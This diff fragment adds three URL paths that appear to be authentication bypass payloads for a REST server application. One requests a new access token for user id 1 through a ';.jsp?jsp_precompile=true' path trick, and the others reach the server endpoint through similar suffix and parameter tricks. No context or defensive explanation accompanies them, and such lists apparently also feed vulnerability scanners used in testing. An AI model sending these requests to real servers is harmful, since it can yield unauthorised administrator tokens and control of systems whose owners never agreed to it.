@@ -1,0 +1,3 @@
+/app/rest/users/id:1/tokens/{{randstr}};.jsp?jsp_precompile=true
+/app/rest/server
+/hax?jsp=/app/rest/server;.jsp
